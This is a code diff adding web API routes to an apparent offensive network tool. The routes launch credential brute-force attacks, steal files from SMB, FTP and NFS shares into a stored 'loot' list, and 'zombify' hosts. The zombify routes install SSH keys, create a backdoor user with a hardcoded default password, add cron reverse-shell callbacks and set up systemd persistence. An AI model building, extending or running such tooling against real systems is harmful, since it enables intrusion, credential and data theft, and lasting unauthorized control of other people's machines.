@@ -38,6 +38,33 @@ from scanner.wifi_attack import (
     get_running_attacks,
     get_captures,
 )
+from scanner.brute_force import (
+    brute_force_service,
+    brute_force_auto,
+    stop_brute_job,
+    stop_all_brute_jobs,
+    get_running_brute_jobs,
+    get_supported_services,
+)
+from scanner.file_stealer import (
+    scan_smb_shares,
+    steal_smb_files,
+    scan_ftp,
+    steal_ftp_files,
+    scan_nfs_exports,
+    steal_nfs_files,
+    auto_steal,
+    get_all_loot,
+)
+from scanner.zombification import (
+    ssh_test_access,
+    install_ssh_key,
+    create_backdoor_user,
+    install_cron_callback,
+    install_systemd_persistence,
+    gather_host_info,
+    check_zombie_status,
+)
 
 logger = logging.getLogger("penstation.api")
 
@@ -488,3 +515,415 @@ async def api_stop_all():
 async def api_captures():
     """List captured handshake files."""
     return get_captures()
+
+
+# ── Brute Force Attacks ──────────────────────────────────
+
+
+class BruteForceRequest(BaseModel):
+    host_ip: str
+    service: str
+    port: int = 0
+    userlist: str = ""
+    passlist: str = ""
+    username: str = ""
+    password: str = ""
+    threads: int = 4
+    timeout: int = 300
+
+
+class BruteForceAutoRequest(BaseModel):
+    host_ip: str
+
+
+@router.get("/bruteforce/services")
+async def api_brute_services():
+    """List supported brute force services and default ports."""
+    return get_supported_services()
+
+
+@router.post("/bruteforce/start")
+async def api_brute_force(req: BruteForceRequest, session: AsyncSession = Depends(get_session)):
+    """Start brute force attack on a service."""
+    result = await brute_force_service(
+        host_ip=req.host_ip,
+        service=req.service,
+        port=req.port,
+        userlist=req.userlist,
+        passlist=req.passlist,
+        username=req.username,
+        password=req.password,
+        threads=req.threads,
+        timeout=req.timeout,
+    )
+
+    # Store credentials in DB
+    if result.get("credentials"):
+        for cred in result["credentials"]:
+            await crud.store_credential(
+                session,
+                host_ip=req.host_ip,
+                service=req.service,
+                port=cred.get("port", req.port or 0),
+                username=cred["username"],
+                password=cred["password"],
+                success=True,
+            )
+
+    return result
+
+
+@router.post("/bruteforce/auto")
+async def api_brute_auto(req: BruteForceAutoRequest, session: AsyncSession = Depends(get_session)):
+    """Auto-detect services on host and brute force them."""
+    ports = await crud.get_host_ports(session, req.host_ip)
+    port_list = [
+        {"port_number": p.port_number, "service": p.service}
+        for p in ports
+    ]
+
+    if not port_list:
+        return {"success": False, "error": "No open ports found. Run a port scan first."}
+
+    credentials = await brute_force_auto(req.host_ip, port_list)
+
+    # Store found credentials
+    for cred in credentials:
+        await crud.store_credential(
+            session,
+            host_ip=req.host_ip,
+            service=cred.get("service", ""),
+            port=cred.get("port", 0),
+            username=cred["username"],
+            password=cred["password"],
+            success=True,
+        )
+
+    return {
+        "success": len(credentials) > 0,
+        "host_ip": req.host_ip,
+        "services_tested": len(port_list),
+        "credentials": credentials,
+    }
+
+
+@router.get("/bruteforce/jobs")
+async def api_brute_jobs():
+    """List running brute force jobs."""
+    return {"jobs": get_running_brute_jobs()}
+
+
+@router.post("/bruteforce/stop")
+async def api_brute_stop_all():
+    """Stop all running brute force jobs."""
+    count = await stop_all_brute_jobs()
+    return {"stopped": count}
+
+
+@router.get("/credentials")
+async def api_credentials(session: AsyncSession = Depends(get_session)):
+    """List all found credentials."""
+    creds = await crud.get_successful_credentials(session)
+    return [
+        {
+            "id": c.id,
+            "host_ip": c.host_ip,
+            "service": c.service,
+            "port": c.port,
+            "username": c.username,
+            "password": c.password,
+            "found_at": c.found_at.isoformat() if c.found_at else None,
+        }
+        for c in creds
+    ]
+
+
+@router.get("/credentials/{host_ip}")
+async def api_host_credentials(host_ip: str, session: AsyncSession = Depends(get_session)):
+    """List credentials for a specific host."""
+    creds = await crud.get_credentials_for_host(session, host_ip)
+    return [
+        {
+            "id": c.id,
+            "service": c.service,
+            "port": c.port,
+            "username": c.username,
+            "password": c.password,
+            "success": c.success,
+            "found_at": c.found_at.isoformat() if c.found_at else None,
+        }
+        for c in creds
+    ]
+
+
+# ── File Exfiltration ────────────────────────────────────
+
+
+class SMBScanRequest(BaseModel):
+    host_ip: str
+    username: str = ""
+    password: str = ""
+
+
+class SMBStealRequest(BaseModel):
+    host_ip: str
+    share: str
+    username: str = ""
+    password: str = ""
+    patterns: list[str] | None = None
+
+
+class FTPScanRequest(BaseModel):
+    host_ip: str
+    port: int = 21
+    username: str = "anonymous"
+    password: str = "anonymous@"
+
+
+class FTPStealRequest(BaseModel):
+    host_ip: str
+    port: int = 21
+    username: str = "anonymous"
+    password: str = "anonymous@"
+    patterns: list[str] | None = None
+
+
+class NFSStealRequest(BaseModel):
+    host_ip: str
+    export_path: str
+    patterns: list[str] | None = None
+
+
+class AutoStealRequest(BaseModel):
+    host_ip: str
+
+
+@router.post("/steal/smb/scan")
+async def api_smb_scan(req: SMBScanRequest):
+    """Scan SMB shares on a host."""
+    return await scan_smb_shares(req.host_ip, req.username, req.password)
+
+
+@router.post("/steal/smb")
+async def api_smb_steal(req: SMBStealRequest, session: AsyncSession = Depends(get_session)):
+    """Steal files from an SMB share."""
+    result = await steal_smb_files(
+        req.host_ip, req.share, req.username, req.password, req.patterns,
+    )
+
+    # Log stolen files to DB
+    for f in result.get("files", []):
+        await crud.log_stolen_file(
+            session,
+            host_ip=req.host_ip,
+            service="smb",
+            file_path=f["remote_path"],
+            local_path=f["local_path"],
+            file_size=f.get("size", 0),
+        )
+
+    return result
+
+
+@router.post("/steal/ftp/scan")
+async def api_ftp_scan(req: FTPScanRequest):
+    """Scan FTP server for files."""
+    return await scan_ftp(req.host_ip, req.port, req.username, req.password)
+
+
+@router.post("/steal/ftp")
+async def api_ftp_steal(req: FTPStealRequest, session: AsyncSession = Depends(get_session)):
+    """Steal files from an FTP server."""
+    result = await steal_ftp_files(
+        req.host_ip, req.port, req.username, req.password, req.patterns,
+    )
+
+    for f in result.get("files", []):
+        await crud.log_stolen_file(
+            session,
+            host_ip=req.host_ip,
+            service="ftp",
+            file_path=f["remote_path"],
+            local_path=f["local_path"],
+            file_size=f.get("size", 0),
+        )
+
+    return result
+
+
+@router.post("/steal/nfs/scan")
+async def api_nfs_scan(req: SMBScanRequest):
+    """Scan NFS exports on a host."""
+    return await scan_nfs_exports(req.host_ip)
+
+
+@router.post("/steal/nfs")
+async def api_nfs_steal(req: NFSStealRequest, session: AsyncSession = Depends(get_session)):
+    """Steal files from NFS export."""
+    result = await steal_nfs_files(req.host_ip, req.export_path, req.patterns)
+
+    for f in result.get("files", []):
+        await crud.log_stolen_file(
+            session,
+            host_ip=req.host_ip,
+            service="nfs",
+            file_path=f["remote_path"],
+            local_path=f["local_path"],
+            file_size=f.get("size", 0),
+        )
+
+    return result
+
+
+@router.post("/steal/auto")
+async def api_auto_steal(req: AutoStealRequest, session: AsyncSession = Depends(get_session)):
+    """Auto-steal from all available services on host."""
+    # Get credentials if we have any
+    creds_rows = await crud.get_credentials_for_host(session, req.host_ip)
+    creds = [
+        {"username": c.username, "password": c.password}
+        for c in creds_rows if c.success
+    ]
+
+    result = await auto_steal(req.host_ip, creds or None)
+
+    for f in result.get("files", []):
+        await crud.log_stolen_file(
+            session,
+            host_ip=req.host_ip,
+            service=f.get("service", ""),
+            file_path=f["remote_path"],
+            local_path=f["local_path"],
+            file_size=f.get("size", 0),
+        )
+
+    return result
+
+
+@router.get("/loot")
+async def api_loot():
+    """List all stolen files (loot)."""
+    return get_all_loot()
+
+
+@router.get("/loot/db")
+async def api_loot_db(session: AsyncSession = Depends(get_session)):
+    """List stolen files from database."""
+    files = await crud.get_all_stolen_files(session)
+    return [
+        {
+            "id": f.id,
+            "host_ip": f.host_ip,
+            "service": f.service,
+            "file_path": f.file_path,
+            "local_path": f.local_path,
+            "file_size": f.file_size,
+            "stolen_at": f.stolen_at.isoformat() if f.stolen_at else None,
+        }
+        for f in files
+    ]
+
+
+# ── Zombification (Persistence) ─────────────────────────
+
+
+class SSHAccessRequest(BaseModel):
+    host_ip: str
+    username: str
+    password: str
+    port: int = 22
+
+
+class SSHKeyRequest(BaseModel):
+    host_ip: str
+    username: str
+    password: str
+    port: int = 22
+
+
+class BackdoorUserRequest(BaseModel):
+    host_ip: str
+    username: str
+    password: str
+    backdoor_user: str = "sysservice"
+    backdoor_pass: str = "Serv1ce!2025"
+    port: int = 22
+
+
+class CronCallbackRequest(BaseModel):
+    host_ip: str
+    username: str
+    password: str
+    callback_ip: str
+    callback_port: int = 4444
+    port: int = 22
+
+
+class SystemdPersistRequest(BaseModel):
+    host_ip: str
+    username: str
+    password: str
+    callback_ip: str
+    callback_port: int = 4445
+    port: int = 22
+
+
+class ZombieCheckRequest(BaseModel):
+    host_ip: str
+    username: str
+    password: str = ""
+    key_path: str = ""
+    port: int = 22
+
+
+@router.post("/zombie/test")
+async def api_ssh_test(req: SSHAccessRequest):
+    """Test SSH access to a host."""
+    return await ssh_test_access(req.host_ip, req.username, req.password, req.port)
+
+
+@router.post("/zombie/ssh-key")
+async def api_install_key(req: SSHKeyRequest):
+    """Install SSH key for persistent access."""
+    return await install_ssh_key(req.host_ip, req.username, req.password, req.port)
+
+
+@router.post("/zombie/backdoor-user")
+async def api_backdoor_user(req: BackdoorUserRequest):
+    """Create backdoor user on target."""
+    return await create_backdoor_user(
+        req.host_ip, req.username, req.password,
+        req.backdoor_user, req.backdoor_pass, req.port,
+    )
+
+
+@router.post("/zombie/cron-callback")
+async def api_cron_callback(req: CronCallbackRequest):
+    """Install cron reverse shell callback."""
+    return await install_cron_callback(
+        req.host_ip, req.username, req.password,
+        req.callback_ip, req.callback_port, req.port,
+    )
+
+
+@router.post("/zombie/systemd-persist")
+async def api_systemd_persist(req: SystemdPersistRequest):
+    """Install systemd persistence service."""
+    return await install_systemd_persistence(
+        req.host_ip, req.username, req.password,
+        req.callback_ip, req.callback_port, req.port,
+    )
+
+
+@router.post("/zombie/gather-info")
+async def api_gather_info(req: SSHAccessRequest):
+    """Gather detailed info from compromised host."""
+    return await gather_host_info(req.host_ip, req.username, req.password, req.port)
+
+
+@router.post("/zombie/check")
+async def api_zombie_check(req: ZombieCheckRequest):
+    """Check if a zombified host is still accessible."""
+    return await check_zombie_status(
+        req.host_ip, req.username, req.password, req.key_path, req.port,
+    )
